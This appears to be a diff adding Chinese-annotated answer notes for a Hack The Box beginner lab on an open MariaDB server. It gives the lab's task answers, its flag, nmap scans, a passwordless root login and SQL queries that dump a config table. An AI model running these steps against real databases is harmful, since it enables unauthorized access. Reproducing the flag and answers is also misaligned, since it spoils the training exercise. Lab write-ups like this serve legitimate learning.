@@ -1,0 +1,49 @@
+task 1:
+    During our scan, which port do we find serving MySQL?
+aswer:
+    3306
+    通过nmap -sV 10.129.108.67可以看到
+task 2:
+    What community-developed MySQL version is the target running?
+aswer:
+    MariaDB
+    nmap -sV -sC 10.129.108.67
+
+task 3:
+    When using the MySQL command line client, what switch do we need to use in order to specify a login username?
+aswer:
+    -u
+    通过mysql --help可以看到答案
+
+task 4：
+    Which username allows us to log into this MariaDB instance without providing a password?
+aswer:
+    root
+
+task 5：
+    In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
+aswer:
+    *
+
+task 6:
+    In SQL, what symbol do we need to end each query with?
+aswer:
+    ;
+
+task 7:
+    There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
+aswer:
+    htb
+
+    mysql -h 10.129.108.67 -u root
+    然后在mysql的终端中使用show databases;
+
+Submit root flag：
+    7b4bec00d1a39e3dd4e021ec3d915da8
+
+    MariaDB [(none)]> use htb
+    MariaDB [(none)]> show tables;
+    MariaDB [htb]>  select * rom config;
+
+参考
+https://medium.com/@mahbuba.shahrin/htb-learn-the-basics-of-pen-testing-sequel-c81435357462
